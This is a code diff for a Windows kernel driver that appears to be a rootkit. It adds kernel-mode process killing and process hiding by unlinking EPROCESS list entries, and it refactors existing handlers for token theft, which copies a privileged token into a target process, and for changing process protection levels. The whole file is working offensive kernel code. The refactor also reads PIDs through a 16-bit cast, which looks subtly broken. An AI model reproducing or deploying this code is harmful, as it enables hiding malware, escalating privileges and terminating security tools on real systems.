@@ -7,6 +7,8 @@
 #include "DriverMeta.hpp"
 #include "Misc.hpp"
 #include "WinTypes.hpp"
+#include "KernelCallbacks.hpp"
+#include "AddressUtils.hpp"
 
 // --------------------------------------------------------------------------------------------------------
 // IOCTLs 
@@ -34,8 +36,10 @@ NTSTATUS BeUnSupportedFunction(PDEVICE_OBJECT pDeviceObject, PIRP Irp);
 NTSTATUS BeIoctlTestDriver(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten);
 NTSTATUS BeIoctlKillProcess(HANDLE pid);
 NTSTATUS BeIoctlProtectProcess(ULONG pid, BYTE newProcessProtection);
-NTSTATUS BeIoctlBuryProcess(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten);
+NTSTATUS BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize);
 NTSTATUS BeIoCtlElevateProcessAcessToken(HANDLE pid);
+NTSTATUS BeIoctlKillProcess(HANDLE pid);
+NTSTATUS BeIoctlHideProcess(HANDLE pid);
 
 // --------------------------------------------------------------------------------------------------------
 
@@ -57,39 +61,54 @@ BeIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
     PIO_STACK_LOCATION pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);;
     ULONG dwDataWritten = 0;
 
-    ULONG targetPid = 0;
-    IOCTL_PROTECT_PROCESS_PAYLOAD payload = { 0 };
+    // Buffer with input from userland
+    PVOID buffer = Irp->AssociatedIrp.SystemBuffer;
 
     if (pIoStackIrp)
     {
         switch (pIoStackIrp->Parameters.DeviceIoControl.IoControlCode)
         {
         case BE_IOCTL_TEST_DRIVER:
-            status = BeIoctlTestDriver(Irp, pIoStackIrp, &dwDataWritten);
+            {
+                status = BeIoctlTestDriver(Irp, pIoStackIrp, &dwDataWritten);
+            }
             break;
 
         case BE_IOCTL_KILL_PROCESS:
-            RtlCopyMemory(&targetPid, Irp->AssociatedIrp.SystemBuffer, sizeof(ULONG)); // Copy over PID parameter from IRP buffer
-            status = BeIoctlKillProcess(ULongToHandle(targetPid));
+            {
+                ULONG targetPid = *(PUINT16)buffer;
+                status = BeIoctlKillProcess(ULongToHandle(targetPid));
+            }
             break;
 
         case BE_IOCTL_ELEVATE_TOKEN:
-            RtlCopyMemory(&targetPid, Irp->AssociatedIrp.SystemBuffer, sizeof(ULONG)); // Copy over PID parameter from IRP buffer
-            status = BeIoCtlElevateProcessAcessToken(ULongToHandle(targetPid));
+            {
+                ULONG targetPid = *(PUINT16)buffer;
+                status = BeIoCtlElevateProcessAcessToken(ULongToHandle(targetPid));
+            }
             break;
 
         case BE_IOCTL_PROTECT_PROCESS:
-            RtlCopyMemory(&payload, Irp->AssociatedIrp.SystemBuffer, sizeof(IOCTL_PROTECT_PROCESS_PAYLOAD)); // Copy over payload from IRP buffer
-            status = BeIoctlProtectProcess(payload.pid, payload.newProtectionLevel);
+            {
+                IOCTL_PROTECT_PROCESS_PAYLOAD payload = { 0 };
+                RtlCopyMemory(&payload, buffer, sizeof(IOCTL_PROTECT_PROCESS_PAYLOAD)); // Copy over payload from IRP buffer
+                status = BeIoctlProtectProcess(payload.pid, payload.newProtectionLevel);
+            }
             break;
 
         case BE_IOCTL_BURY_PROCESS:
-            status = BeIoctlBuryProcess(Irp, pIoStackIrp, &dwDataWritten);
+            {
+                PWCHAR processToBury = (PWCHAR)buffer;
+                ULONG stringSize = pIoStackIrp->Parameters.DeviceIoControl.InputBufferLength;
+                status = BeIoctlBuryProcess(processToBury, stringSize);
+            }
             break;
 
         case BE_IOCTL_HIDE_PROCESS:
-            RtlCopyMemory(&targetPid, Irp->AssociatedIrp.SystemBuffer, sizeof(ULONG)); // Copy over PID parameter from IRP buffer
-            status = BeIoctlHideProcess(ULongToHandle(targetPid));
+            {
+                ULONG targetPid = *(PUINT16)buffer;
+                status = BeIoctlHideProcess(ULongToHandle(targetPid));
+            }
             break;
         }
     }
@@ -171,7 +190,7 @@ BeIoctlProtectProcess(ULONG pid, BYTE newProtectionLevel)
         return STATUS_INVALID_PARAMETER_1;
     }
 
-    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + 0x87a; // TODO: avoid hardcoded offsets
+    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + BeGetEprocessProcessProtectionOffset();
 
     DbgPrint("Current protection level: %i", *((BYTE*)(EProtectionLevel)));
 
@@ -189,12 +208,9 @@ BeIoctlProtectProcess(ULONG pid, BYTE newProtectionLevel)
  * @return NTSTATUS status code.
  */
 NTSTATUS
-BeIoctlBuryProcess(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten)
+BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize)
 {
-    UNREFERENCED_PARAMETER(pdwDataWritten);
     NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
-    WCHAR* pInputBuffer = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;
-    ULONG dwSize = pIoStackIrp->Parameters.DeviceIoControl.InputBufferLength;
 
     DbgPrint("BeIoctlBuryProcess called, size: %i \r\n", dwSize);
     __try
@@ -206,15 +222,15 @@ BeIoctlBuryProcess(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritt
             return STATUS_INVALID_BUFFER_SIZE;
         }
 
-        if (!pInputBuffer)
+        if (!processToBury)
         {
             DbgPrint("Empty buffer \r\n");
             return STATUS_INVALID_PARAMETER;
         }
 
-        DbgPrint("String received: %ws \r\n", pInputBuffer);
+        DbgPrint("String received: %ws \r\n", processToBury);
 
-        if (BeIsStringTerminated(pInputBuffer, dwSize) == FALSE)
+        if (BeIsStringTerminated(processToBury, dwSize) == FALSE)
         {
             DbgPrint("Not null terminated! \r\n");
             return STATUS_UNSUCCESSFUL;
@@ -223,7 +239,7 @@ BeIoctlBuryProcess(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritt
         if (BeGlobals::buryProcess.buryRoutineAdded)
         {
             DbgPrint("Routine already exists! \r\n");
-            return STATUS_SUCCESS;
+            return STATUS_SUCCESS; // TODO: return status indicating that one was already added
         }
 
         // Allocate global memory for process name and copy over to global
@@ -232,7 +248,7 @@ BeIoctlBuryProcess(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritt
         {
             return STATUS_MEMORY_NOT_ALLOCATED;
         }
-        RtlCopyMemory(BeGlobals::buryProcess.beBuryTargetProcessName, pInputBuffer, dwSize);
+        RtlCopyMemory(BeGlobals::buryProcess.beBuryTargetProcessName, processToBury, dwSize);
 
         DbgPrint("String now: %ws \r\n", BeGlobals::buryProcess.beBuryTargetProcessName);
 
@@ -273,7 +289,7 @@ BeIoCtlElevateProcessAcessToken(HANDLE pid)
     NtStatus = PsLookupProcessByProcessId(pid, &targetProcess);
     if (NtStatus != 0)
     {
-        DbgPrint("PID %i not found", (ULONG)pid);
+        DbgPrint("PID %i not found", HandleToUlong(pid));
         return NtStatus;
     }
 
@@ -292,4 +308,59 @@ BeIoCtlElevateProcessAcessToken(HANDLE pid)
     *(ULONG64*)((ULONG64)targetProcess + tokenOffset) = *(ULONG64*)((ULONG64)privilegedProcess + tokenOffset);
 
     return NtStatus;
+}
+
+/**
+ * Kills a process by PID.
+ *
+ * @param pid PID of the process to kill
+ * @return NTSTATUS status code.
+ */
+NTSTATUS
+BeIoctlKillProcess(HANDLE pid)
+{
+    HANDLE hProcess = NULL;
+
+    if (BeGetEprocessByPid(HandleToULong(pid)) == NULL)
+    {
+        return STATUS_INVALID_PARAMETER;
+    }
+
+    CLIENT_ID ci;
+    ci.UniqueProcess = pid;
+    ci.UniqueThread = 0;
+
+    OBJECT_ATTRIBUTES obj;
+    obj.Length = sizeof(obj);
+    obj.Attributes = 0;
+    obj.ObjectName = 0;
+    obj.RootDirectory = 0;
+    obj.SecurityDescriptor = 0;
+    obj.SecurityQualityOfService = 0;
+
+    ZwOpenProcess(&hProcess, 1, &obj, &ci);
+    NTSTATUS NtStatus = ZwTerminateProcess(hProcess, 0);
+    ZwClose(hProcess);
+
+    DbgPrint("KillProcess %i \r\n", NtStatus);
+    return NtStatus;
+}
+
+/**
+ * Hides a process by removing it from the linked list of active processes referenced in EPROCESS.
+ *
+ * @param pid PID of target process.
+ * @return NTSTATUS status code.
+ */
+NTSTATUS
+BeIoctlHideProcess(HANDLE pid)
+{
+    PEPROCESS targetProcess = BeGetEprocessByPid(HandleToULong(pid));
+    if (targetProcess == NULL)
+    {
+        return STATUS_INVALID_PARAMETER;
+    }
+    PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + BeGetProcessLinkedListOffset());
+    RemoveEntryList(processListEntry);
+    return STATUS_SUCCESS;
 }
